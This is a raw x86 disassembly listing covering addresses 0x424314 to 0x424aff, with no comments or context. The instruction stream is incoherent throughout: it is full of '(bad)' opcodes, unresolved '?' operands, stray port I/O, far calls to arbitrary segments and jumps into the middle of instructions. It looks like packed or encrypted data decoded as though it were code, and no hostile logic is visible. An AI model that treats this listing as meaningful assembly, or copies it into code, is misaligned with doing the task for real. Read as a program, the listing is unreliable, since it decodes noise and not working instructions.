  424314:	mov    ch,0x1f
  424316:	cld    
  424317:	call   0xcb2b:0x694aa020
  42431e:	cs aaa 
  424320:	push   cs
  424321:	int    0xf0
  424323:	shl    DWORD PTR fs:[esi+edi*8],cl
  424327:	xchg   eax,edx
  424329:	and    BYTE PTR [esi+0x61c059c5],ch
  42432f:	adc    DWORD PTR [ecx-0x72],0x7b4534be
  424336:	jg     0x4243b5
  424338:	push   ds
  424339:	mov    edi,0xb3ba644c
  42433e:	arpl   WORD PTR [ebx-0x211dc26b],si
  424344:	cs js  0x4243ad
  424347:	pop    ss
  424348:	mov    ebp,0x796c91d1
  42434d:	int    0xec
  42434f:	jmp    0x424386
  424351:	cs ss mov ah,0x1e
  424355:	jecxz  0x42436c
  424357:	les    edx,FWORD PTR [ecx+0x2f]
  42435a:	cmp    BYTE PTR [esi],bl
  42435c:	in     eax,dx
  42435d:	add    eax,0xd3b940d8
  424362:	jne    0x4242fe
  424364:	(bad)  
  424365:	jg     0x424307
  424367:	pop    edi
  424368:	xchg   ebx,eax
  424369:	icebp  
  42436a:	in     eax,dx
  42436b:	adc    bl,bl
  42436d:	mov    ebx,0xe880f084
  424372:	out    dx,al
  424373:	test   DWORD PTR [ecx-0x1c2d0d53],eax
  424379:	fbld   TBYTE PTR [ebp-0x4f]
  42437c:	in     eax,dx
  42437d:	sub    BYTE PTR [edx-0x36],al
  424380:	adc    eax,0xf9898032
  424385:	add    ebx,ebp
  424387:	stc    
  424388:	mov    edx,0xe4764990
  42438d:	mov    cl,0x8c
  42438f:	sub    ah,BYTE PTR [esi-0x67]
  424392:	test   eax,0xb2a576e5
  424397:	adc    DWORD PTR [esi+0x3e04d3c3],ebx
  42439d:	dec    ebx
  42439e:	imul   edx,DWORD PTR [ebp+0x4c941296],0xffffffff
  4243a5:	or     al,0x90
  4243a7:	in     al,dx
  4243a8:	inc    esp
  4243a9:	sbb    al,0xfb
  4243ab:	or     ch,bh
  4243ad:	jl     0x4243a9
  4243af:	sub    eax,0x9cf43fff
  4243b5:	push   cs
  4243b6:	pop    ecx
  4243b7:	xchg   esp,eax
  4243b8:	bound  edi,QWORD PTR [ecx+0x24ef2544]
  4243be:	test   DWORD PTR [ebp-0x78],0x5c3146cc
  4243c5:	mov    eax,ds:0x68e51af7
  4243ca:	outs   dx,BYTE PTR ds:[esi]
  4243cb:	fsubr  DWORD PTR [ebp-0x467c0afa]
  4243d1:	stc    
  4243d2:	loope  0x424362
  4243d4:	stc    
  4243d5:	jecxz  0x4243e3
  4243d7:	and    DWORD PTR [edi-0x24],esp
  4243da:	and    ebx,DWORD PTR [ecx+esi*1-0x15521b66]
  4243e1:	jae    0x424366
  4243e3:	popf   
  4243e4:	sub    DWORD PTR [edi+0x38],edi
  4243e7:	dec    eax
  4243e8:	test   edx,eax
  4243ea:	xor    al,0x2e
  4243ec:	jno    0x4243bd
  4243ee:	mov    bh,0x67
  4243f0:	mov    ah,0x58
  4243f2:	int3   
  4243f3:	jno    0x4243e2
  4243f5:	mov    dh,0x8
  4243f7:	in     eax,dx
  4243f8:	or     eax,edi
  4243fa:	sbb    DWORD PTR [esi+0x4aa5d75d],esi
  424400:	(bad)  
  424401:	shr    ecx,0x95
  424404:	loope  0x4243d6
  424406:	or     eax,0x2d1d41b0
  42440b:	repnz adc bh,BYTE PTR [ebp-0x3666e3fa]
  424412:	xchg   edx,eax
  424413:	push   ebp
  424414:	in     eax,0x65
  424416:	addr16 call 0xb3ad2815
  42441c:	mov    DWORD PTR [eax+eiz*2-0x5b],esi
  424420:	adc    DWORD PTR [ecx-0x51d198d0],0xb9f9c7cf
  42442a:	jmp    0x9e46a1d9
  42442f:	add    ebp,DWORD PTR [ebx]
  424431:	cmc    
  424432:	jg     0x4244ae
  424434:	fdivr  st,st(3)
  424436:	cwde   
  424437:	xlat   BYTE PTR ds:[ebx]
  424438:	jge    0x424464
  42443a:	push   0xffffffdf
  42443c:	jmp    0x42448a
  42443e:	sub    DWORD PTR [edx+ecx*2-0x2104291f],0x25
  424446:	dec    eax
  424447:	popf   
  424448:	ins    BYTE PTR es:[edi],dx
  424449:	jbe    0x4244ba
  42444b:	or     al,0x4d
  42444d:	out    dx,eax
  42444e:	sar    DWORD PTR [eax],0xbd
  424451:	cmp    BYTE PTR [esi+0xd],cl
  424454:	inc    ecx
  424455:	cmc    
  424456:	pusha  
  424457:	sbb    DWORD PTR [esi-0x1e5b3c2c],esp
  42445d:	xor    edi,edi
  42445f:	dec    ebp
  424461:	add    al,0xe5
  424463:	or     esp,DWORD PTR ds:0x37a9e9fd
  424469:	sub    bl,BYTE PTR [ebx]
  42446b:	(bad)  
  42446c:	es enter 0x3083,0x45
  424471:	and    esi,DWORD PTR [esi]
  424473:	lock xor bl,BYTE PTR [ebp*1+0x2e1c5d6d]
  42447b:	mov    ds:0x16e41437,eax
  424480:	fld    QWORD PTR [ecx+edi*8-0x5f]
  424484:	imul   ecx,DWORD PTR [esi+0x70],0xc9315474
  42448b:	jge    0x424444
  42448d:	aad    0xc9
  42448f:	dec    eax
  424490:	add    dl,BYTE PTR [ebx+eax*2+0x696ef3e8]
  424497:	std    
  424498:	int3   
  424499:	cdq    
  42449a:	xchg   DWORD PTR [edi+0x71abc200],ecx
  4244a0:	cmp    ebp,DWORD PTR [edx]
  4244a2:	push   ss
  4244a3:	pop    ds
  4244a4:	xchg   esp,ecx
  4244a6:	sbb    DWORD PTR [edi+0x30],ebp
  4244a9:	xchg   edx,eax
  4244aa:	sub    DWORD PTR [edx+ebp*4+0x59],esp
  4244ae:	push   ss
  4244af:	ds dec esi
  4244b1:	push   ebx
  4244b2:	test   al,0x82
  4244b4:	pop    ds
  4244b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244b6:	es (bad) 
  4244b8:	outs   dx,DWORD PTR ds:[esi]
  4244b9:	into   
  4244ba:	sub    bl,ah
  4244bc:	jmp    0x3e5f4613
  4244c1:	rol    DWORD PTR [esi],0x8e
  4244c4:	in     eax,dx
  4244c5:	jnp    0x42446b
  4244c7:	and    eax,0x3e914e88
  4244cc:	jecxz  0x42452f
  4244ce:	jl     0x424492
  4244d0:	jmp    0x424532
  4244d2:	push   ds
  4244d3:	mov    eax,0x6597b975
  4244d8:	int3   
  4244d9:	in     eax,dx
  4244da:	call   0x7c0b2456
  4244df:	repnz push esp
  4244e1:	xchg   edx,eax
  4244e2:	mov    edx,0x9505e01e
  4244e7:	call   0xfd575fde
  4244ec:	ins    BYTE PTR es:[edi],dx
  4244ed:	fisub  DWORD PTR [esi-0xaf2eec8]
  4244f3:	or     ah,bh
  4244f5:	lea    edi,[ebx-0x5d]
  4244f8:	jmp    0xd4edf636
  4244fd:	push   ebp
  4244fe:	xor    eax,DWORD PTR [edi-0x1ae19017]
  424504:	or     ecx,ebp
  424506:	aad    0xef
  424508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424509:	pusha  
  42450a:	jmp    0x42456f
  42450c:	pop    esi
  42450d:	mov    edi,0xc6f4118a
  424512:	xchg   eax,edx
  424514:	into   
  424515:	je     0x42456e
  424517:	sbb    DWORD PTR [edi-0x5a4c22e1],ecx
  42451d:	les    eax,FWORD PTR [eax-0x41ae4fa1]
  424523:	(bad)  
  424524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424525:	loopne 0x424536
  424527:	dec    esp
  424528:	popf   
  424529:	push   ebx
  42452a:	sahf   
  42452b:	adc    ebx,DWORD PTR [edi-0x10]
  42452e:	mov    ah,0xaf
  424530:	je     0x4244b8
  424532:	dec    ebx
  424533:	(bad)  
  424534:	pop    eax
  424535:	and    eax,0xc887a4cc
  42453a:	mov    ?,WORD PTR [ebx+0x4359994e]
  424540:	cbw    
  424542:	hlt    
  424543:	stos   BYTE PTR es:[edi],al
  424544:	fbstp  TBYTE PTR [ecx+eax*8-0x5f9e4a0b]
  42454b:	inc    esi
  42454c:	fst    st(0)
  42454e:	lock add eax,0xe5d8d41a
  424554:	mov    edi,0xde54a3f9
  424559:	sbb    DWORD PTR [esi-0x60],ebx
  42455c:	ficom  WORD PTR [edi+0x4d]
  42455f:	cmp    eax,0x52d5d407
  424564:	jae    0x424527
  424566:	fwait
  424567:	and    DWORD PTR [edi],0xffffff9c
  42456a:	iret   
  42456b:	push   0xffffffe6
  42456d:	jne    0x4245be
  42456f:	jmp    0x1d2610d0
  424574:	call   0xb883:0xe2404cce
  42457b:	jecxz  0x4245c8
  42457d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42457e:	push   ds
  42457f:	push   ds
  424580:	fs sbb al,0x61
  424583:	dec    esi
  424584:	pop    edi
  424585:	xor    bl,BYTE PTR [eax]
  424587:	icebp  
  424588:	ds sbb eax,0x592d87fd
  42458e:	adc    BYTE PTR [ecx+ecx*8],bh
  424591:	lods   eax,DWORD PTR ds:[esi]
  424592:	lahf   
  424593:	retf   0x9e01
  424596:	out    0xd2,eax
  424598:	sbb    eax,DWORD PTR [eax]
  42459a:	add    BYTE PTR [eax],al
  42459c:	push   esp
  42459d:	ds and al,0x19
  4245a0:	outs   dx,BYTE PTR ds:[esi]
  4245a1:	sbb    edi,DWORD PTR [ebp+0x7f]
  4245a4:	(bad)  
  4245a5:	mov    eax,0x76bccfc0
  4245aa:	or     edi,DWORD PTR [eax+0x1bf31]
  4245b0:	test   DWORD PTR [edx],eax
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	ret    
  4245b5:	imul   edx,ebp,0xef8c542d
  4245bb:	cmp    eax,0xad1ba76f
  4245c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245c1:	leave  
  4245c2:	inc    edx
  4245c3:	aad    0xe8
  4245c5:	pop    esi
  4245c6:	into   
  4245c7:	sbb    eax,0x6a2f77ab
  4245cc:	pushf  
  4245cd:	pop    edx
  4245ce:	aad    0x4a
  4245d0:	stos   BYTE PTR es:[edi],al
  4245d1:	or     ebx,DWORD PTR [edi+eax*8]
  4245d4:	outs   dx,DWORD PTR ds:[esi]
  4245d5:	mov    dh,0xf8
  4245d7:	out    0x2e,al
  4245d9:	imul   ebx,DWORD PTR [ecx-0x25],0x158dd025
  4245e0:	shl    BYTE PTR [ebx+ecx*4+0x22904191],cl
  4245e7:	sbb    eax,0x52c8c7bf
  4245ec:	jmp    0x424618
  4245ee:	mov    esp,?
  4245f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245f1:	xor    al,0x46
  4245f3:	pop    ss
  4245f4:	mov    ss,WORD PTR [esi-0x60]
  4245f7:	xor    dh,ah
  4245f9:	cmp    ebp,DWORD PTR [edx+0x26]
  4245fc:	push   ebx
  4245fd:	lea    eax,[edx+edx*2-0x44]
  424601:	pushf  
  424602:	ins    DWORD PTR es:[edi],dx
  424603:	ror    edi,0xbc
  424606:	xor    eax,0x1637d489
  42460b:	leave  
  42460c:	adc    bl,BYTE PTR [edx]
  42460e:	jge    0x42468e
  424610:	out    dx,al
  424611:	rol    BYTE PTR [edx+0x2c],1
  424614:	fadd   QWORD PTR [ebx]
  424616:	jmp    0x436b:0x5c7e0a38
  42461d:	ret    0x2f33
  424620:	jmp    0xfc1a6f0f
  424625:	push   0xffffff8a
  424627:	inc    esi
  424628:	or     eax,0x325724b
  42462d:	sbb    DWORD PTR ss:[esp+eax*4],0xebe1c692
  424635:	clc    
  424636:	dec    ebp
  424637:	xor    DWORD PTR [edx-0x27],ebx
  42463a:	inc    esp
  42463b:	push   ebx
  42463c:	sar    ecx,cl
  42463e:	mov    eax,ds:0xb023e5ca
  424643:	push   ebx
  424644:	sub    DWORD PTR [ebp+ebx*4+0xa91ae71],ebx
  42464b:	fs and al,0xaa
  42464e:	xor    eax,0xc5613916
  424653:	inc    eax
  424654:	enter  0xe19c,0xa1
  424658:	jnp    0x424672
  42465a:	pop    ecx
  42465b:	les    ebp,FWORD PTR [esi+0x22a2fe61]
  424661:	retf   
  424662:	xor    edx,esp
  424664:	(bad)  
  424666:	sub    al,0x34
  424668:	nop
  424669:	mov    ds:0xf2584a5c,eax
  42466e:	push   ebx
  42466f:	out    0xd,al
  424671:	sbb    ah,0x7
  424674:	inc    esi
  424675:	cld    
  424676:	pushf  
  424677:	pop    esp
  424678:	bnd jns 0x4246f0
  42467b:	test   BYTE PTR [ebp-0x3b],ch
  42467e:	add    ecx,DWORD PTR [ecx+0x4e3c4515]
  424684:	mov    cl,0x8c
  424686:	mov    bh,0x87
  424688:	ror    DWORD PTR [ebx-0x597dd9e5],0x2a
  42468f:	dec    ecx
  424690:	jmp    0xb0522ac0
  424695:	out    0xe9,al
  424697:	inc    edi
  424698:	mov    cs:0x1a1a95bc,al
  42469e:	ss mov al,0xa0
  4246a1:	mov    ds:0x2fd9b1b7,al
  4246a6:	xchg   esi,eax
  4246a7:	xchg   edi,eax
  4246a8:	fwait
  4246a9:	sub    al,0x62
  4246ab:	or     BYTE PTR [edi+0x53],ch
  4246ae:	mov    eax,0xb4b9c083
  4246b3:	pop    edi
  4246b4:	cmc    
  4246b5:	cmp    dh,dh
  4246b7:	xchg   ebp,eax
  4246b8:	nop
  4246b9:	jp     0x424697
  4246bb:	cmp    esp,DWORD PTR [edx]
  4246bd:	xor    esi,esp
  4246bf:	xchg   esi,eax
  4246c0:	mov    dh,BYTE PTR ds:0xa3b049d2
  4246c6:	fadd   QWORD PTR ds:0x3bf2ce68
  4246cc:	enter  0xec1d,0x0
  4246d0:	jb     0x4246fd
  4246d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246d3:	test   BYTE PTR [ebx],0x32
  4246d6:	inc    edx
  4246d7:	lds    ebx,FWORD PTR [ecx]
  4246d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246da:	(bad)
  4246dd:	ins    DWORD PTR es:[edi],dx
  4246de:	imul   esp,DWORD PTR [esi],0x34
  4246e1:	aam    0x2b
  4246e3:	mov    ecx,0xeb79ac95
  4246e8:	mov    esi,0xa503fc32
  4246ed:	jge    0x424718
  4246ef:	inc    eax
  4246f0:	xchg   DWORD PTR [edx+0x497096cd],ebp
  4246f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246f7:	fdivr  QWORD PTR [edx-0x7072d4f2]
  4246fd:	icebp  
  4246fe:	and    BYTE PTR [ecx],dl
  424700:	jns    0x424754
  424702:	jp     0x4246ac
  424704:	xor    cl,BYTE PTR [ecx+0x3dfdeb1]
  42470a:	adc    eax,0xff8686d4
  42470f:	jo     0x68c6c1f4
  424715:	xor    DWORD PTR [ebx-0x3e57b484],ebx
  42471b:	ret    
  42471c:	aad    0xb3
  42471e:	add    esp,DWORD PTR [edx]
  424720:	sbb    BYTE PTR [ebx-0x3b],bh
  424723:	mov    bh,0x9a
  424725:	cs jecxz 0x424796
  424728:	add    bh,BYTE PTR [edx-0x2d122731]
  42472e:	(bad)
  424732:	fisubr DWORD PTR [ecx]
  424734:	push   ss
  424735:	mov    dh,0x3d
  424737:	aas    
  424738:	clc    
  424739:	das    
  42473a:	add    ah,al
  42473c:	xchg   ecx,eax
  42473d:	test   ch,al
  42473f:	sbb    DWORD PTR [edx+0x73],esi
  424742:	push   0x4f
  424744:	sahf   
  424745:	xchg   edx,eax
  424746:	popf   
  424747:	iret   
  424748:	sub    edi,edx
  42474a:	call   0x8ddc:0x9d4ed0b6
  424751:	hlt    
  424752:	imul   esp,DWORD PTR [edx+0x2d6e87ac],0x99bf4479
  42475c:	xchg   BYTE PTR [esp+eiz*2],bh
  42475f:	mov    ebx,DWORD PTR [esi]
  424761:	pop    ebp
  424762:	lea    edi,[edi+ebx*1]
  424765:	(bad)  
  424766:	loop   0x4246f1
  424768:	jo     0x424773
  42476a:	sub    eax,0xc0e4f761
  42476f:	addr16 out 0x71,eax
  424772:	(bad)  
  424773:	sahf   
  424774:	adc    edi,DWORD PTR [edi+0x54696e63]
  42477a:	outs   dx,DWORD PTR ds:[esi]
  42477b:	gs aam 0x42
  42477e:	xchg   esp,eax
  42477f:	jmp    0x8b275d3e
  424784:	fs mov al,0x4f
  424787:	pop    es
  424788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424789:	aas    
  42478a:	push   eax
  42478b:	mov    eax,fs
  42478d:	std    
  42478e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42478f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424790:	mov    WORD PTR [eax+0x375364a6],es
  424796:	inc    esp
  424797:	jne    0x4247b8
  424799:	xor    DWORD PTR [edx-0x3b],esp
  42479c:	fs ds pop ebx
  42479f:	call   0x5481:0x92960fd5
  4247a6:	jl     0x424768
  4247a8:	shr    BYTE PTR [ebx-0x13fb6c9],0xc6
  4247af:	push   ecx
  4247b0:	js     0x4247a7
  4247b2:	jmp    0x424798
  4247b4:	(bad)  
  4247b5:	test   DWORD PTR [ebx+edi*2-0x7ad4c879],0x44cad498
  4247c0:	stos   DWORD PTR es:[di],eax
  4247c2:	mov    edx,0xfa102c93
  4247c7:	jnp    0x424765
  4247c9:	shl    WORD PTR [eax+ebx*2+0x4ed75d84],cl
  4247d1:	or     DWORD PTR [ebp+esi*4+0x49c98d15],ebp
  4247d8:	cmc    
  4247d9:	(bad)  
  4247da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247db:	scas   al,BYTE PTR es:[edi]
  4247dc:	cld    
  4247dd:	(bad)  
  4247df:	lds    ecx,FWORD PTR [ebx-0x33]
  4247e2:	adc    dh,ch
  4247e4:	jns    0x4247e6
  4247e6:	pop    eax
  4247e7:	xchg   BYTE PTR [eax+0x138bfd0b],bh
  4247ed:	push   si
  4247ef:	sti    
  4247f0:	jmp    0xc34fdb16
  4247f5:	cli    
  4247f6:	sti    
  4247f7:	out    0x23,al
  4247f9:	into   
  4247fa:	mov    ecx,0x510b54fe
  4247ff:	icebp  
  424800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424801:	mov    eax,0x5e0e0bf0
  424806:	sbb    eax,DWORD PTR [ecx-0x60]
  424809:	xor    al,0x4f
  42480b:	push   edi
  42480c:	sub    ebx,DWORD PTR [esi+0x16]
  42480f:	mov    al,ds:0x6ca68c0a
  424814:	xchg   ecx,eax
  424815:	fldcw  WORD PTR ds:0x17b9c7cf
  42481b:	xor    DWORD PTR [ecx+0x15],0xffffffe4
  42481f:	pop    ecx
  424820:	cmp    dl,BYTE PTR [ebx-0x2f]
  424823:	sub    bl,BYTE PTR [edi-0x5fa77895]
  424829:	imul   esi,DWORD PTR [ecx+0xd],0xf00f8145
  424830:	mov    BYTE PTR [eax],ah
  424832:	xor    eax,ebx
  424834:	jge    0x4247d0
  424836:	jae    0x42488e
  424838:	jns    0x42483a
  42483a:	add    BYTE PTR [eax],al
  42483c:	mov    esi,0x74ef74ea
  424841:	(bad)  
  424842:	mov    edi,0x98b349fb
  424847:	xor    bl,BYTE PTR [eax+0x58]
  42484a:	adc    eax,0x1c1b6f9
  42484f:	add    BYTE PTR [ebp+0xd000002],al
  424855:	ins    BYTE PTR es:[edi],dx
  424856:	and    eax,0x201fe987
  42485b:	jno    0x42489b
  42485d:	fdivr  DWORD PTR es:[ebx+0x9866cfb]
  424864:	mov    ah,0xde
  424866:	mov    dl,0x16
  424868:	clc    
  424869:	in     al,dx
  42486a:	pop    eax
  42486b:	push   0x1b44b2a4
  424870:	adc    ch,BYTE PTR [ebx+eiz*4]
  424873:	mov    ds,eax
  424875:	mov    bl,0x59
  424877:	ins    DWORD PTR es:[edi],dx
  424878:	outs   dx,DWORD PTR ds:[esi]
  424879:	xor    al,0x11
  42487b:	icebp  
  42487c:	xchg   esp,eax
  42487d:	mov    ecx,0x1642f49d
  424882:	jecxz  0x4248f0
  424884:	push   ds
  424885:	aas    
  424886:	mov    DWORD PTR ds:0x76783fd6,ecx
  42488c:	adc    DWORD PTR [edx+0x1812db5d],ebx
  424892:	gs dec ebx
  424894:	mov    ds:0x5a4a8e28,al
  424899:	inc    esp
  42489a:	add    dh,BYTE PTR [edx]
  42489c:	mov    ah,0x39
  42489e:	fistp  DWORD PTR fs:[edx]
  4248a1:	and    dl,BYTE PTR [ecx]
  4248a3:	cmp    al,0x6a
  4248a5:	pop    ecx
  4248a6:	push   0x2f
  4248a8:	inc    ebx
  4248a9:	jmp    0x4248fd
  4248ab:	push   ss
  4248ac:	xchg   DWORD PTR [eax-0x2f],eax
  4248af:	or     edi,ebp
  4248b1:	das    
  4248b2:	adc    ah,BYTE PTR [ebx+0x743303cd]
  4248b8:	add    BYTE PTR [esi-0x6a],bh
  4248bb:	push   es
  4248bc:	loope  0x424893
  4248be:	js     0x4248fb
  4248c0:	push   0x7f59e914
  4248c5:	leave  
  4248c6:	arpl   WORD PTR [edi+edi*1+0x17],bp
  4248ca:	out    0x22,eax
  4248cc:	mov    cl,0xd8
  4248ce:	xchg   edx,eax
  4248cf:	(bad)  [edx]
  4248d1:	ss push edx
  4248d3:	imul   edi,DWORD PTR [eax+edx*4-0x57],0xd
  4248d8:	add    bh,dh
  4248da:	jno    0x424907
  4248dc:	xor    al,BYTE PTR [edx]
  4248de:	xchg   edx,eax
  4248df:	ds nop
  4248e1:	leave  
  4248e2:	sub    bh,BYTE PTR [edi+eax*1+0x7e]
  4248e6:	xor    ebp,DWORD PTR [ebx]
  4248e8:	push   0x742f9b36
  4248ed:	(bad)  
  4248ee:	aam    0x19
  4248f0:	ror    DWORD PTR [ecx],0x68
  4248f3:	int    0xae
  4248f5:	imul   ebx,DWORD PTR [edi],0x3dc1f630
  4248fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248fc:	sbb    edx,DWORD PTR [edi+0x21980163]
  424902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424903:	inc    ebx
  424904:	adc    al,0xcd
  424906:	push   ecx
  424907:	popf   
  424908:	mov    cl,0x5f
  42490a:	push   esp
  42490b:	out    0x6e,al
  42490d:	dec    ebx
  42490e:	(bad)  
  42490f:	push   esp
  424910:	jb     0x42498c
  424912:	(bad)  
  424913:	std    
  424914:	outs   dx,DWORD PTR ds:[esi]
  424915:	outs   dx,DWORD PTR ds:[esi]
  424916:	cmp    eax,0x122f05e5
  42491b:	lahf   
  42491c:	xchg   DWORD PTR [eax],edx
  42491e:	xor    BYTE PTR [edx+0x26],dl
  424921:	adc    ebx,DWORD PTR ds:0x8142f663
  424927:	daa    
  424928:	mov    bh,0x69
  42492a:	and    esi,esp
  42492c:	or     DWORD PTR [eax+esi*8+0x6017714b],esp
  424933:	mov    DWORD PTR [edi+0x75e8a1f],ebp
  424939:	cmp    BYTE PTR [ebp+eiz*4+0x5a],dh
  42493d:	frstor [ebx-0x356105c2]
  424943:	cwde   
  424944:	mov    esp,0xf4f8a18d
  424949:	xchg   edx,eax
  42494a:	sbb    BYTE PTR [edx+0xc],cl
  42494d:	popf   
  42494e:	sahf   
  42494f:	stos   BYTE PTR es:[edi],al
  424950:	cdq    
  424951:	sbb    eax,DWORD PTR [ebx+0x2a]
  424954:	pusha  
  424955:	xchg   ebp,eax
  424956:	daa    
  424957:	mov    esp,0x92062aba
  42495c:	jo     0x424986
  42495e:	scas   al,BYTE PTR es:[edi]
  42495f:	pushf  
  424960:	call   0x7ec8:0x8daae54a
  424967:	repnz enter 0xe1e8,0xe
  42496c:	push   cs
  42496d:	xchg   esi,eax
  42496e:	cs pop ebp
  424970:	sub    cl,dl
  424972:	dec    ebp
  424973:	inc    ebp
  424974:	jmp    DWORD PTR [bp+0x8]
  424978:	inc    edi
  424979:	ror    DWORD PTR [eax-0x1b6c1cd0],1
  42497f:	bound  eax,QWORD PTR [ebx]
  424981:	scas   eax,DWORD PTR es:[edi]
  424982:	pop    esi
  424983:	std    
  424984:	in     eax,0x99
  424986:	inc    ebp
  424987:	lods   al,BYTE PTR ds:[esi]
  424988:	lods   eax,DWORD PTR ds:[esi]
  424989:	xor    ecx,DWORD PTR [ebx]
  42498b:	pop    edi
  42498c:	pop    ss
  42498d:	pop    ebx
  42498e:	enter  0x6cad,0x88
  424992:	mov    eax,ds:0x863be453
  424997:	mov    cl,0x67
  424999:	jo     0x42499b
  42499b:	sub    eax,0x528a74
  4249a0:	js     0x424a15
  4249a2:	push   esp
  4249a3:	and    eax,0x89ed5d3b
  4249a8:	inc    eax
  4249a9:	ficomp WORD PTR [ebp+0x32270fa8]
  4249af:	mov    BYTE PTR [edi-0x58],dh
  4249b2:	sub    BYTE PTR [esp+eax*8-0x68],cl
  4249b6:	fisubr WORD PTR [ecx-0x53]
  4249b9:	jl     0x4249ed
  4249bb:	sbb    eax,DWORD PTR [edi-0x45b73b91]
  4249c1:	dec    ebp
  4249c2:	and    eax,0x8ba4e4af
  4249c7:	je     0x42496d
  4249c9:	outs   dx,DWORD PTR ds:[esi]
  4249ca:	imul   ecx,DWORD PTR [ebp-0xe4ef315],0xffffffad
  4249d1:	test   al,0xb6
  4249d3:	mov    dl,0xbc
  4249d5:	mov    dl,0x7d
  4249d7:	shl    BYTE PTR [esi+0x33],cl
  4249da:	cmp    bl,BYTE PTR [edi+0x43]
  4249dd:	xchg   ch,bh
  4249df:	in     eax,dx
  4249e0:	sbb    al,0x42
  4249e2:	xchg   ecx,eax
  4249e3:	jecxz  0x4249a5
  4249e5:	int    0x86
  4249e7:	adc    ch,bl
  4249e9:	gs sbb al,0xff
  4249ec:	jne    0x424a51
  4249ee:	pop    ds
  4249ef:	(bad)  
  4249f0:	or     BYTE PTR [ecx-0x2b],al
  4249f3:	(bad)  
  4249f4:	add    BYTE PTR [ecx+0x7e],0x50
  4249f8:	xlat   BYTE PTR ds:[ebx]
  4249f9:	mov    WORD PTR [ecx+0xf24d874],?
  4249ff:	rcr    BYTE PTR [esp+edx*1+0x77],1
  424a03:	ret    0x7a31
  424a06:	sub    al,0x98
  424a08:	rcr    esi,cl
  424a0a:	adc    edx,DWORD PTR [edx]
  424a0c:	out    0x8b,al
  424a0e:	and    BYTE PTR [edx+0x25],0xf4
  424a12:	test   DWORD PTR [esi+0x5b],0x59970d78
  424a19:	mov    ebp,0x63a99a3d
  424a1e:	(bad)  [eax+0x1d1857b6]
  424a24:	in     eax,0xe6
  424a26:	lods   al,BYTE PTR ds:[esi]
  424a27:	pop    ss
  424a28:	fadd   st(4),st
  424a2a:	in     al,dx
  424a2b:	mov    esp,0x6a6210a
  424a30:	in     al,0xbd
  424a32:	dec    eax
  424a33:	in     eax,0xf8
  424a35:	adc    BYTE PTR [edi],0x11
  424a38:	mov    esp,0xcc9ac4b8
  424a3d:	out    0x5a,eax
  424a3f:	clc    
  424a40:	retf   0x58e0
  424a43:	pop    ebx
  424a44:	adc    DWORD PTR [ebp-0x3b61317],0x22
  424a4b:	pop    edi
  424a4c:	and    BYTE PTR [edx+0x56],ch
  424a4f:	xchg   ebp,eax
  424a50:	ret    0x94bf
  424a53:	jno    0x424a13
  424a55:	mov    bl,0x8
  424a57:	je     0x4249e8
  424a59:	out    0x49,eax
  424a5b:	adc    DWORD PTR [edx-0x3c],ebp
  424a5e:	jo     0x4249f7
  424a60:	pop    ebx
  424a61:	mov    esp,DWORD PTR [edi+0x38]
  424a64:	bnd jmp 0x424a28
  424a67:	std    
  424a68:	ror    edx,1
  424a6a:	add    ah,BYTE PTR [ebp-0x60]
  424a6d:	or     BYTE PTR [esi],ch
  424a6f:	pusha  
  424a70:	scas   eax,DWORD PTR es:[edi]
  424a71:	fdiv   DWORD PTR [edx+0x4a98181c]
  424a77:	pop    ds
  424a78:	dec    ecx
  424a79:	dec    BYTE PTR [edi-0x64]
  424a7c:	pusha  
  424a7d:	push   esp
  424a7e:	rcr    bl,cl
  424a80:	arpl   WORD PTR [ebx+0x5],sp
  424a83:	xchg   ebx,eax
  424a84:	cmp    DWORD PTR [esi-0x9802ef1],esi
  424a8a:	xor    eax,0x573c8d71
  424a8f:	test   al,0xa2
  424a91:	push   ecx
  424a92:	cmp    al,BYTE PTR [edx-0x48c3e95b]
  424a98:	repnz in eax,dx
  424a9a:	fst    st(3)
  424a9c:	push   cs
  424a9d:	xor    BYTE PTR [esi+0x5580e1d0],dh
  424aa3:	repnz loop 0x424a5e
  424aa6:	mov    dh,0xa4
  424aa8:	lahf   
  424aa9:	(bad)  
  424aaa:	mov    ah,0xb7
  424aac:	push   0xaf06e0fb
  424ab1:	in     al,dx
  424ab2:	cmp    ecx,edx
  424ab4:	aaa    
  424ab5:	mov    ecx,0xaa93f446
  424aba:	sub    ch,BYTE PTR [eax]
  424abc:	das    
  424abd:	(bad)  
  424abe:	or     esi,DWORD PTR [ebx+0x7f]
  424ac1:	dec    ecx
  424ac2:	aaa    
  424ac3:	and    al,0x14
  424ac5:	das    
  424ac6:	fld    QWORD PTR [ebp-0x53]
  424ac9:	mov    ds:0x64e87477,al
  424ace:	dec    eax
  424acf:	je     0x424b2a
  424ad1:	xor    DWORD PTR [ecx+0x4],0xffffff9c
  424ad5:	xchg   esp,eax
  424ad6:	push   ebx
  424ad7:	mov    ?,WORD PTR [esi+0x4b000000]
  424add:	inc    ebp
  424ade:	mov    edx,0x5fffbeee
  424ae3:	in     eax,0x54
  424ae5:	stos   BYTE PTR es:[edi],al
  424ae6:	clc    
  424ae7:	adc    DWORD PTR [eax],eax
  424ae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aea:	pop    ebp
  424aeb:	fdivr  DWORD PTR [ebx]
  424aed:	les    eax,FWORD PTR [ecx]
  424aef:	add    BYTE PTR [ebp+0x5c000002],al
  424af5:	fmul   st,st(1)
  424af7:	(bad)  
  424af8:	mov    bl,0xd2
  424afa:	popf   
  424afb:	dec    BYTE PTR [edx+ebp*4-0x80]
  424aff:	mov    dh,bl
